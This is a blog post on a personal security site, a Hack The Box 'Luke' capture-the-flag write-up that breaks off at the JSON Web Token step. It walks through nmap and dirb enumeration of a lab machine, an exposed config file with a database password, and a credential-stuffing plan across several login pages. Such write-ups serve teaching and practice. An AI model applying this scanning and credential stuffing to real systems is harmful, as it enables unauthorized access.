<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.7750550c0319f5de56d916b91e642bf72a5bd09ee50b201dc2ed9db69d6177a8.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/images/favicon.ico>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">Ryan Kozak - Hack the Box Luke Writeup</title>
<meta property="og:title" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Luke&#32;Writeup />
<meta name="twitter:title" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Luke&#32;Writeup />
<meta itemprop="name" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Luke&#32;Writeup />
<meta name="application-name" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Luke&#32;Writeup />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="/posts/hack-the-box-luke-writeup/" />
<link rel="canonical" href="/posts/hack-the-box-luke-writeup/" itemprop="url" />
<meta name="url" content="/posts/hack-the-box-luke-writeup/" />
<meta name="twitter:url" content="/posts/hack-the-box-luke-writeup/" />
<meta property="og:url" content="/posts/hack-the-box-luke-writeup/" />


<meta property="og:updated_time" content="2019-09-15T04:43:53-07:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.148.2">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.117852018032301f808a95d56d6fc439362aeccb5e908470799fb0ea57959877.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

    
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type":  "Person",
  "@id":    "https://ryankozak.com/#ryan-kozak",
  "name":   "Ryan Kozak",
  "jobTitle": "Offensive Security Engineer - Security Researcher",
  "url":    "https://ryankozak.com",
  "image":  "https://ryankozak.com/images/ryan-kozak.jpg",
  "description": "Known hacker, cybersecurity researcher, former OWASP Sacramento Chapter lead, credited with multiple CVEs.",
  "sameAs": [
      "https://github.com/d0n601",
      "https://www.linkedin.com/in/ryan-kozak\/",
      "https://patchstack.com/database/researcher/ryan-kozak",
      "https://www.wordfence.com/threat-intel/vulnerabilities/researchers/ed9aaed9-ca13-413a-a5e3-af97095a4252",
      "https://stackoverflow.com/users/4681506/ryan-kozak"
  ],
  "knowsAbout": ["Hacking", "Red Teaming", "Offensive Security", "Penetration Testing", "Programming"]
}
</script> 
    <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "WebSite",
  "@id": "https://ryankozak.com/#website",
  "url": "https://ryankozak.com/",
  "name": "RyanKozak.com",
  "publisher": { "@id": "https://ryankozak.com/#ryan-kozak" },
}
</script>
    
    </head>

    <body class="">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="/">
                <img src="/images/d0n601.jpg" alt="brand image">
            </a>
        
        
            <a href="/">
                <h1>Ryan Kozak</h1>
            </a>
        
    </h1>
    <p class="lead">
    Hacking, CVEs, Development, and Other Things.
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about">About Me</a>
                    </li>
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Recent</a>
                    </li>
                    
                        <li class="sub-heading">
                            
                        </li>
                        
                            <li class="bullet">
                                <a href="/posts/cve-2025-9216/">StoreEngine – Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales &amp; More &lt;= 1.4.0 - Authenticated (Subscriber&#43;) Arbitrary File Upload</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="/posts/cve-2025-9215/">StoreEngine Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales &amp; More &lt;= 1.4.0 - Authenticated (Subscriber&#43;) Arbitrary File Download</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="/posts/cve-2025-6085/">Make Connector &lt;= 1.5.10 - Authenticated (Admin&#43;) Arbitrary File Upload</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="/posts/cve-2025-23968/">AI Bud – AI Content Generator, AI Chatbot, ChatGPT, Gemini, GPT-4o</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="/posts/cve-2025-6586/">Download Plugin &lt;= 2.2.8 - Authenticated (Admin&#43;) Arbitrary File Upload via the dpwap_plugin_locInstall Function</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/d0n601">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/ryan-kozak/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>















    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>


    <a target="_blank" class="social" title="Email" href="mailto:website@ryankozak.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>




        <p class="footnote">
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "TechArticle",
  "@id": "\/posts\/hack-the-box-luke-writeup\/#article",
  "headline": "\"Hack the Box Luke Writeup\"",
  "author": { "@id": "" },
  "datePublished": "2019-09-15",
  "dateModified": "2019-09-15",
  "inLanguage": "en",
  "mainEntityOfPage": { "@type": "WebPage", "@id": "\/posts\/hack-the-box-luke-writeup\/" }
}
</script>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type":    "TechArticle",
  "headline": "\"Hack the Box Luke Writeup\"",
  "datePublished": "2019-09-15",
  "dateModified":  "2019-09-15",
  "author":   { "@id": "\/#ryan-kozak" },
  "publisher": {
    "@type": "Organization",
    "name":  "Ryan Kozak",
    "logo": {
      "@type": "ImageObject",
      "url": "\/images\/d0n601.png"
    }
  },
  "image": "null",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "\/posts\/hack-the-box-luke-writeup\/"
  }
}
</script>
<div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="/posts/hack-the-box-luke-writeup/">Hack the Box Luke Writeup</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2019-09-15T04:43:53-0700" class="post-date">
        September 15, 2019
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>9 mins read</span>
      </span>
    </div>

    
  </div>

  
  

  
</div>

  <p><img src="/posts/images/hack-the-box-luke-writeup/badge.png" alt="Hack The Box Luke"></p>
<h1 id="intro">Intro</h1>
<p>So they finally retired Luke. While this box was far from one of my favorites, it has a lot of sentimental value to me because it was the first box I rooted after joining <a href="https://hackthebox.eu" target="_blank">Hack The Box</a>. Luke wasn&rsquo;t all that technically challenging (as you will see in the writeup below). There was a lot of enumeration involved, credential stuffing, a bit of guess work, and no privilege escalation what so ever. It taught me to write down everything during a <del>pentest</del> CTF, even if it seems useless. You never know what you&rsquo;ll need to use later. All of that said, please find my writeup below.</p>
<h2 id="information-gathering">Information Gathering</h2>
<h3 id="nmap">Nmap</h3>
<p>We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.</p>
<pre tabindex="0"><code>root@kali:/media/sf_Research# nmap -sVC 10.10.10.137
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-10 18:46 EDT
Nmap scan report for 10.10.10.137
Host is up (0.60s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.244
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesnt have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 282.80 seconds
</code></pre><p>From the above output we can see that ports <strong>21</strong>, <strong>22</strong>, <strong>80</strong>, <strong>3000</strong>, and <strong>8000</strong> are all open. This gives us a lot of entry points to begin testing. The FTP port allows anonymous logins, which seems like a good place to start exploring manually. Additionally, the  <em><a href="http://ajenti.org/" target="_blank">Ajenti</a></em> service running on port <code>8000</code> seems like our ultimate goal, as it&rsquo;s an administrative control panel.</p>
<h3 id="port-21-anonymous-ftp-exploration">Port 21: Anonymous FTP Exploration</h3>
<p>Exploring the open FTP port, we only find one file <code>for_Chihiro.txt</code>.</p>
<p><img src="/posts/images/hack-the-box-luke-writeup/ftp.png" alt="for_Chihiro.txt"></p>
<pre tabindex="0"><code>Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
the actual website I&#39;ve created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !

Derry
</code></pre><p>This doesn&rsquo;t give us a lot of information, but there are two usernames to add to our list, <strong>chihiro</strong> and <strong>derry</strong>.</p>
<h3 id="port-80-apache">Port 80: Apache</h3>
<p>Next, we run <strong>dirb</strong> in order to enumerate files and directories on the Apache server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# dirb http://10.10.10.137 -X &#34;,.php,.txt&#34;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>-----------------
</span></span><span style="display:flex;"><span>DIRB v2.22    
</span></span><span style="display:flex;"><span>By The Dark Raver
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>START_TIME: Fri Jun 10 19:09:10 2019
</span></span><span style="display:flex;"><span>URL_BASE: http://10.10.10.137/
</span></span><span style="display:flex;"><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span></span><span style="display:flex;"><span>EXTENSIONS_LIST: (,.php,.txt) | ()(.php)(.txt) [NUM = 3]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>-----------------
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>GENERATED WORDS: 4612                                                          
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>---- Scanning URL: http://10.10.10.137/ ----
</span></span><span style="display:flex;"><span>+ http://10.10.10.137/config.php (CODE:200|SIZE:202)                                  
</span></span><span style="display:flex;"><span>==&gt; DIRECTORY: http://10.10.10.137/css/                                               
</span></span><span style="display:flex;"><span>+ http://10.10.10.137/index.html (CODE:200|SIZE:3138)                                 
</span></span><span style="display:flex;"><span>==&gt; DIRECTORY: http://10.10.10.137/js/                                                
</span></span><span style="display:flex;"><span>+ http://10.10.10.137/LICENSE (CODE:200|SIZE:1093)                                    
</span></span><span style="display:flex;"><span>+ http://10.10.10.137/login.php (CODE:200|SIZE:1593)                                  
</span></span><span style="display:flex;"><span>+ http://10.10.10.137/management (CODE:401|SIZE:381)                                  
</span></span><span style="display:flex;"><span>==&gt; DIRECTORY: http://10.10.10.137/member/                                            
</span></span><span style="display:flex;"><span>==&gt; DIRECTORY: http://10.10.10.137/vendor/                                            
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>---- Entering directory: http://10.10.10.137/css/ ----
</span></span><span style="display:flex;"><span>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style="display:flex;"><span>    (Use mode &#39;-w&#39; if you want to scan it anyway)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>---- Entering directory: http://10.10.10.137/js/ ----
</span></span><span style="display:flex;"><span>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style="display:flex;"><span>    (Use mode &#39;-w&#39; if you want to scan it anyway)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>---- Entering directory: http://10.10.10.137/member/ ----
</span></span><span style="display:flex;"><span>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style="display:flex;"><span>    (Use mode &#39;-w&#39; if you want to scan it anyway)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>---- Entering directory: http://10.10.10.137/vendor/ ----
</span></span><span style="display:flex;"><span>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style="display:flex;"><span>    (Use mode &#39;-w&#39; if you want to scan it anyway)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>-----------------
</span></span><span style="display:flex;"><span>END_TIME: Fri Jun 10 23:52:16 2019
</span></span><span style="display:flex;"><span>DOWNLOADED: 13836 - FOUND: 5
</span></span></code></pre></div><p>There is an exposed configuration file found <code>config.php</code>, which contains the <code>root</code> password for <code>MySQL</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$dbHost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>; $dbUsername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root&#39;</span>; $dbPassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Zk6heYCyv6ZE9Xcg&#39;</span>; $db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;login&#34;</span>; $conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($dbHost, $dbUsername, $dbPassword,$db) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Connect failed: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span> $conn <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">error</span>);
</span></span></code></pre></div><h3 id="port-3000-nodejs">Port 3000: NodeJS</h3>
<p>As we did with port <code>80</code>, we run <strong>dirb</strong> in order to enumerate directories. Since this appears to be an API returning JSON we&rsquo;re not including any file extensions in the scan.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# dirb http://10.10.10.137:3000 -w
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>-----------------
</span></span><span style="display:flex;"><span>DIRB v2.22    
</span></span><span style="display:flex;"><span>By The Dark Raver
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>START_TIME: Fri Jun 11 00:38:53 2019
</span></span><span style="display:flex;"><span>URL_BASE: http://10.10.10.137:3000/
</span></span><span style="display:flex;"><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span></span><span style="display:flex;"><span>OPTION: Not Stopping on warning messages
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>-----------------
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>GENERATED WORDS: 4612                                                          
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>---- Scanning URL: http://10.10.10.137:3000/ ----
</span></span><span style="display:flex;"><span>+ http://10.10.10.137:3000/login (CODE:200|SIZE:13)                                   
</span></span><span style="display:flex;"><span>+ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)                                   
</span></span><span style="display:flex;"><span>+ http://10.10.10.137:3000/users (CODE:200|SIZE:56)                                   
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>-----------------
</span></span><span style="display:flex;"><span>END_TIME: Fri Jun 11 01:36:36 2019
</span></span><span style="display:flex;"><span>DOWNLOADED: 4612 - FOUND: 3
</span></span></code></pre></div><p>Luke is very much an exercise in enumeration. We see from the above scan that there are endpoints on port <code>3000</code> for <code>/login</code>, and <code>/users</code>. When we use another HTTP enumeration tool (dirbuster) we discover the sub directory  <code>/users/admin</code>. This is an important reminder that not all wordlists and tools behave the same way, and we must try different things when we&rsquo;re stuck. In this instance <code>dirb</code> was supposed to be scanning recursively, but ignored this subdirectory.</p>
<p><img src="/posts/images/hack-the-box-luke-writeup/dirbuster.png" alt="dirbuster on port 3000 discovers /usrs/admin"></p>
<h3 id="port-8000-ajenti">Port 8000: Ajenti</h3>
<p>HTTP enumeration on port 8000 failed to discover anything. All we know is that there&rsquo;s a login page available to us, and that we need to get in.</p>
<p><img src="/posts/images/hack-the-box-luke-writeup/ajenti.png" alt="Ajenti Login Page on Port 8000"></p>
<h2 id="exploitation">Exploitation</h2>
<p>Now we&rsquo;ve gathered all the information we can and it&rsquo;s time to begin our attack. So far we have collected four login pages and two potential user names. In order to increase our potential user count we add <code>root</code>, <code>admin</code>, and <code>administrator</code> to the list, as they&rsquo;re common on most systems. We will also try different capitalizations of the names if we fail to login to any of our entry points after exhausting the list.</p>
<table>
  <thead>
      <tr>
          <th><strong>Login Pages</strong></th>
          <th><strong>Potential Users</strong></th>
          <th><strong>Passwords</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>http://10.10.10.137/login.php</td>
          <td>admin</td>
          <td>Zk6heYCyv6ZE9Xcg</td>
      </tr>
      <tr>
          <td>http://10.10.10.137/management/</td>
          <td>administrator</td>
          <td></td>
      </tr>
      <tr>
          <td>http://10.10.10.137:3000/login</td>
          <td>chihiro</td>
          <td></td>
      </tr>
      <tr>
          <td>http://10.10.10.137:8000</td>
          <td>derry</td>
          <td></td>
      </tr>
      <tr>
          <td></td>
          <td>root</td>
          <td></td>
      </tr>
  </tbody>
</table>
<p>Our first point to attack is port <code>8000</code>, as it&rsquo;s the most critical. After a bit of research the default credentials to Ajenti appear to be <code>root</code> for a username and <code>admin</code> for a password, but these do not work in this case. None of our potential users in combination with our MySQL password, authenticate us on Ajenti. Now we move on to the other services. After trying our list of potential users and password on port <code>8000</code> first, <code>/login.php</code> second, and <code>/management</code> third, we&rsquo;ve not succeeded to login to any of them.</p>
<p>Port <code>3000</code> requires we craft some headers properly in order to attempt to authenticate, and out of laziness it&rsquo;s the last on the list of login pages to try our credentials on.</p>
<h3 id="json-web-tokens">JSON Web Tokens</h3>
<p>When we attempt to visit port <code>3000</code> we&rsquo;re given the following response indicating we&rsquo;re not authenticated.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;success&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Auth token is not supplied&#34;</span>}
</span></span></code></pre></div><p>When we sent a GET request to the the <code>/login</code> endpoint we&rsquo;re returned text asking us to authenticate.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl http://10.10.10.137:3000/login
</span></span><span style="display:flex;"><span>&#34;please auth&#34;
